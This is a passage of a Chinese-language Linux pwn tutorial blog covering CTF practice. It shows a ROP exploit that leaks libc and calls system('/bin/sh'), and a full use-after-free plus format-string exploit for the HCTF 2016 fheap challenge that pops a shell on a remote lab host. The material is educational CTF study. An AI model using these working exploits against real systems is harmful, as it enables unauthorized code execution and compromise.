class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0000000000400587 &lt;main&gt;:</span></span><br><span class="line"><span class="string">  400587:	55                   	push   %rbp</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">main_static = <span class="number">0x0000000000400587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_write(rdi=1,rsi=got_write, rdx=8)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line">payload1 =<span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                               <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># call_address : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">8</span>)                                       <span class="comment"># param3       : 8</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># param2       : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">1</span>)                                       <span class="comment"># param1       : 1</span></span><br><span class="line"></span><br><span class="line">payload1 += p64(rdx_rsi_rdi_callr12_ret)                 <span class="comment"># call r12</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">7</span>                                     <span class="comment"># add    $0x8,%rsp # 6 pop</span></span><br><span class="line">payload1 += p64(main_static)                             <span class="comment"># return main</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload1 call got_write(rdi=1,rsi=got_write, rdx=8)"</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">print(<span class="string">"[+] write_addr = 0x%x"</span> % write_addr)</span><br><span class="line"></span><br><span class="line">write_static = libc_elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_static = libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (write_static - system_static)</span><br><span class="line">print(<span class="string">"[+] system_addr = 0x%x"</span> % system_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">  [26] .bss              NOBITS           0000000000601040  00001040</span></span><br><span class="line"><span class="string">       0000000000000008  0000000000000000  WA       0     0     1</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000601040</span></span><br><span class="line">bss_addr2 = linux_x64_test3_elf.bss()</span><br><span class="line">print(<span class="string">"[+] bss_addr  = 0x%x"</span> % bss_addr)</span><br><span class="line">print(<span class="string">"[+] bss_addr2 = 0x%x"</span> % bss_addr2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_read(rdi=0,rsi=bss_addr, rdx=16)</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr, rdx=8)             write system</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr+8, rdx=8)           write /bin/sh</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)    <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload2 += p64(got_read)                                    <span class="comment"># call_address : got_read</span></span><br><span class="line">payload2 += p64(<span class="number">16</span>)                                          <span class="comment"># param3       : 16</span></span><br><span class="line">payload2 += p64(bss_addr)                                    <span class="comment"># param2       : bss_addr</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)                                           <span class="comment"># param1       : 0</span></span><br><span class="line"></span><br><span class="line">payload2 += p64(rdx_rsi_rdi_callr12_ret)                     <span class="comment"># call r12</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">7</span>                                         <span class="comment"># add    $0x8,%rsp   6 pop</span></span><br><span class="line">payload2 += p64(main_static)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload2 call got_read(rdi=0,rsi=bss_addr, rdx=16)"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr) + <span class="string">"/bin/sh\0"</span>)  <span class="comment">#send /bin/sh\0</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">00000000:00601040|00007f111b941390|........|</span></span><br><span class="line"><span class="string">00000000:00601048|0068732f6e69622f|/bin/sh.|</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># call bss_addr(rdi=bss_addr+8) system_addr(rdi=binsh_addr)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload3 =<span class="string">"A"</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)     <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload3 += p64(bss_addr)                                    <span class="comment"># call_address : bss_addr</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param3       : 0</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param2       : 0</span></span><br><span class="line">payload3 += p64(bss_addr+<span class="number">8</span>)                                  <span class="comment"># param1       : bss_addr+8</span></span><br><span class="line"></span><br><span class="line">payload3 += p64(rdx_rsi_rdi_callr12_ret)        <span class="comment"># call r12</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)*<span class="number">7</span>                            <span class="comment"># add $0x8,%rsp   6 pop</span></span><br><span class="line">payload3 += p64(main_static)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] send payload3 call system_addr(rdi=binsh_addr)"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="实践4-释放后使用（Use-After-Free）学习"><a href="#实践4-释放后使用（Use-After-Free）学习" class="headerlink" title="实践4_释放后使用（Use-After-Free）学习"></a>实践4_释放后使用（Use-After-Free）学习</h3><p>用 <a href="https://github.com/zh-explorer/hctf2016-fheap" target="_blank" rel="noopener">2016HCTF_fheap</a>作为学习目标，该题存在格式化字符漏洞和UAF漏洞。<br>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。格式化字符漏洞是控制第一个参数可能导致任意地址读写。<br>释放后使用（Use-After-Free）漏洞是内存块被释放后，其对应的指针没有被设置为 NULL,再次申请内存块特殊改写内存导致任意地址读或劫持控制流。</p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>checksec查询发现全开了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序很简单就3个操作，create,delete,quit<br><img src="https://i.loli.net/2020/05/20/ocXIbSTWuF7iJPA.jpg" alt="-w497"></p>
<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>在delete操作上发现调用free指针函数释放结构后没有置结构指针为NULL,这样就能实现UAF，  如下图<br><img src="https://i.loli.net/2020/05/20/bH2NKA3CpfrBDPV.jpg" alt="-w710"></p>
<p>create功能会先申请0x20字节的内存堆块存储结构，如果输入的字符串长度大于0xf，则另外申请指定长度的空间存储数据，否则存储在之前申请的0x20字节的前16字节处，在最后，会将相关free函数的地址存储在堆存储结构的后八字节处<br><img src="https://i.loli.net/2020/05/20/xtGHUhoyOK7erjq.jpg" alt="-w467"><br>在create时全局结构指向我们申请的内存<br><img src="https://i.loli.net/2020/05/20/KAVDOuT18wUpnWm.jpg" alt="-w401"><br>这样就可以恶意构造结构数据,利用uaf覆盖旧数据结果的函数指针，打印出函数地址，泄露出二进制base基址，主要逻辑如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create(4 创建old_chunk0 但是程序占位 old_chunk0_size=0x30 申请0x20</span><br><span class="line">create(4 创建old_chunk1 但是程序占位 old_chunk1_size=0x30 申请0x20</span><br><span class="line">释放chunk1</span><br><span class="line">释放chunk0</span><br><span class="line">create(0x20 创建 chunk0 占位 old_chunk0,占位 old_chunk1</span><br><span class="line">            创建 chunk1 覆盖 old_chunk1-&gt;data-&gt;free 为 puts</span><br></pre></td></tr></table></figure>
<p>此时执行delete操作，也就执行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">free(ptr) -&gt; puts(ptr-&gt;buffer和后面覆盖的puts地址)</span><br></pre></td></tr></table></figure>
<p>打印出了puts_addr地址，然后通过计算偏移得到二进制基址,如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bin_base_addr = puts_addr - offset</span><br></pre></td></tr></table></figure>
<p>然后利用二进制基址算出二进制自带的 printf 真实地址，再次利用格式化字符漏洞实现任意地址读写。<br>如下是得到printf 真实地址 printf_addr后利用格式化字符漏洞实现任意地址读写的测试过程，我们输出10个%p 也就打印了堆栈前几个数据值。然后找到了 arg9 为我们能够控制的数据，所以利用脚本里printf输出参数变成了 “%9$p”，读取第九个参数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">'a%p%p%p%p%p%p%p%p%p%p'</span>.ljust(<span class="number">0x18</span>, <span class="string">'#'</span>) + p64(printf_addr)  <span class="comment"># 覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">create(<span class="number">0x20</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">p.send(<span class="string">"delete "</span>)</span><br><span class="line">p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">p.send(<span class="string">"yes.1111"</span> + p64(addr) + <span class="string">"\n"</span>)  <span class="comment"># 触发 printf漏洞</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br></pre></td></tr></table></figure>
<p>IDA调试时内存数据为如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000560DFCD3C000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C010  40 C0 D3 FC 0D 56 00 00  00 00 00 00 00 00 00 00  @....V..........</span><br><span class="line">0000560DFCD3C020  1E 00 00 00 00 00 00 00  6C CD 7C FB 0D 56 00 00  ........l....V..</span><br><span class="line">0000560DFCD3C030  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C040  61 25 70 25 70 25 70 25  70 25 70 25 70 25 70 25  a%p%p%p%p%p%p%p%</span><br><span class="line">0000560DFCD3C050  70 25 70 25 70 23 23 23  D0 C9 7C FB 0D 56 00 00  p%p%p<span class="comment">###..|..V..</span></span><br><span class="line"></span><br><span class="line">00007FFE50BF9630  00 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  ................</span><br><span class="line">00007FFE50BF9640  79 65 73 2E 31 31 31 31  00 60 8C 2B 45 56 00 00  yes.1111.`.+EV..</span><br><span class="line"></span><br><span class="line">00007FFCA59554F8  0000560DFB7CCE95  delete_sub_D95+100</span><br><span class="line">00007FFCA5955500  0000000000000000</span><br><span class="line">00007FFCA5955508  0000000100000000  arg7</span><br><span class="line">00007FFCA5955510  313131312E736579  arg8</span><br><span class="line">00007FFCA5955518  0000560DFB7CC000  LOAD:0000560DFB7CC000 <span class="comment"># arg9 读取这个 arg9  所以这里选择 %9$s</span></span><br><span class="line">00007FFCA5955520  000000000000000A</span><br><span class="line">00007FFCA5955528  0000560DFB7CCA50  start</span><br><span class="line">00007FFCA5955530  00007FFCA5955D90  [stack]:00007FFCA5955D90</span><br></pre></td></tr></table></figure>
<p>利用格式化字符串漏洞实现任意地址后，读取两个libc函数然后确定libc版本,获取对应libc版本的system_addr</p>
<h4 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># target = process('pwn-f')</span></span><br><span class="line">p = remote(<span class="string">'172.16.36.176'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn-f"</span>)</span><br><span class="line">libc_elf = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, string)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'create '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">    p.send(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'3.quit'</span>)</span><br><span class="line">    p.sendline(<span class="string">'delete '</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">if</span> len(data) &lt;= <span class="number">8</span>:</span><br><span class="line">        log.info(<span class="string">"&#123;&#125;"</span>.format(hex(u64(data.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line">    <span class="comment">#step 1 create &amp; delete</span></span><br><span class="line">    create(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">    create(<span class="number">4</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 2 recover old function addr</span></span><br><span class="line">    pwn = ELF(<span class="string">'./pwn-f'</span>)</span><br><span class="line">    payload = <span class="string">"aaaaaaaa"</span>.ljust(<span class="number">0x18</span>,<span class="string">'b'</span>)+<span class="string">'\x2d'</span><span class="comment">#  recover low bits,the reason why i choose \x2d is that the system flow decide by</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload) <span class="comment"># 申请大于0xf的内存会多申请一次 占位chunk0 和 chunk1,申请的内容覆盖 chunk1-&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用的是之前留下的chunk1 然后被覆盖</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># call free -&gt; call _puts</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 3 leak base addr</span></span><br><span class="line">    p.recvuntil(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> len(data)&gt;<span class="number">8</span>:</span><br><span class="line">        data=data[:<span class="number">8</span>]</span><br><span class="line">    data = u64(data.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))<span class="comment"># leaked puts address use it to calc base addr</span></span><br><span class="line">    pwn_base_addr = data - <span class="number">0xd2d</span> <span class="comment"># 减去二进制base</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"pwn_base_addr : &#123;&#125;"</span>.format(hex(pwn_base_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free -&gt; printf</span></span><br><span class="line">    <span class="comment"># 我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印</span></span><br><span class="line">    <span class="comment">#step 4 get printf func addr</span></span><br><span class="line">    printf_plt = pwn.plt[<span class="string">'printf'</span>]</span><br><span class="line">    printf_addr = pwn_base_addr + printf_plt <span class="comment">#get real printf addr</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"printf_addr : &#123;&#125;"</span>.format(hex(printf_addr)))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 5 leak system addr</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)  <span class="comment"># 继续调用 free  -&gt; puts</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment">#this one can not be ignore because DynELF use the delete() at begin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露malloc_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(elf.got[<span class="string">"malloc"</span>] + pwn_base_addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line">    malloc_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    log.info(<span class="string">"malloc_addr : &#123;&#125;"</span>.format(hex(malloc_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露 puts_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a%9$s'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"quit"</span>)</span><br><span class="line">    p.send(<span class="string">"delete "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">    p.send(str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"?:"</span>)</span><br><span class="line">    p.send(<span class="string">"yes.1111"</span>+p64(elf.got[<span class="string">"puts"</span>] + pwn_base_addr)+<span class="string">"\n"</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'####'</span>)[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    log.info(<span class="string">"puts_addr : &#123;&#125;"</span>.format(hex(puts_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过两个libc函数计算libc ,确定system_addr</span></span><br><span class="line">    <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    obj = LibcSearcher(<span class="string">"puts"</span>, puts_addr)</span><br><span class="line">    obj.add_condition(<span class="string">"malloc"</span>, malloc_addr)</span><br><span class="line">    <span class="comment"># obj.selectin_id(3)</span></span><br><span class="line"></span><br><span class="line">    libc_base = malloc_addr-obj.dump(<span class="string">"malloc"</span>)</span><br><span class="line">    system_addr = obj.dump(<span class="string">"system"</span>)+libc_base  <span class="comment"># system 偏移</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"system_addr : &#123;&#125;"</span>.format(hex(system_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 6 recover old function to system then get shell</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">0x20</span>,<span class="string">'/bin/bash;'</span>.ljust(<span class="number">0x18</span>,<span class="string">'#'</span>)+p64(system_addr)) <span class="comment"># attention /bin/bash; i don`t not why add the ';'</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这些入门pwn知识的学习，对栈溢出,堆溢出,uaf的利用会有清晰的理解。对以后分析真实利用场景漏洞有很大的帮助。利用脚本尽量做的通用，考虑多个平台。那么分析利用有了，对于漏洞挖掘这方面又是新的一个课题，对于这方面的探索将另外写文章分析。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制" target="_blank" rel="noopener">linux程序的常用保护机制</a><br><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">linux-pwn</a><br><a href="https://blog.csdn.net/zhy557/article/details/80832268" target="_blank" rel="noopener">https://blog.csdn.net/zhy557/article/details/80832268</a></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/04/06/tips_about/ida-help/" rel="prev" title="ida_help">
      <i class="fa fa-chevron-left"></i> ida_help
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/11/06/browser_about/CVE-2019-5782-zhaoqixun-2018-11-16%E5%8F%91-7-2/" rel="next" title="CVE-2019-5782_zhaoqixun_2018_11_16发_7.2">
      CVE-2019-5782_zhaoqixun_2018_11_16发_7.2 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    
  
  <div class="comments">
  <script src="https://utteranc.es/client.js" repo="pandamac/pandamac.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>
  </div>
  
  
    
<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux-pwn入门学习到放弃"><span class="nav-text">linux pwn入门学习到放弃</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux程序的常用保护机制"><span class="nav-text">linux程序的常用保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><span class="nav-text">CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FORTIFY-轻微的检查"><span class="nav-text">FORTIFY/轻微的检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NX-DEP-数据执行保护"><span class="nav-text">NX/DEP/数据执行保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASLR-Address-space-layout-randomization"><span class="nav-text">ASLR (Address space layout randomization)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIE和PIC"><span class="nav-text">PIE和PIC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RELRO-read-only-relocation"><span class="nav-text">RELRO(read only relocation)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn工具常见整合"><span class="nav-text">pwn工具常见整合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools"><span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pycharm"><span class="nav-text">pycharm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ida"><span class="nav-text">ida</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb附加"><span class="nav-text">gdb附加</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb插件枚举"><span class="nav-text">gdb插件枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EDB附加"><span class="nav-text">EDB附加</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lldb插件"><span class="nav-text">lldb插件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实践"><span class="nav-text">实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实践1-栈溢出-利用溢出改变程序走向"><span class="nav-text">实践1_栈溢出_利用溢出改变程序走向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#编译测试用例"><span class="nav-text">编译测试用例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成构造的数据"><span class="nav-text">生成构造的数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取到溢出偏移"><span class="nav-text">获取到溢出偏移</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取-callsystem-函数地址"><span class="nav-text">获取 callsystem 函数地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编写并测试利用-提权"><span class="nav-text">编写并测试利用_提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实践2-栈溢出-通过ROP绕过DEP和ASLR防护"><span class="nav-text">实践2_栈溢出_通过ROP绕过DEP和ASLR防护</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#编译测试用例-1"><span 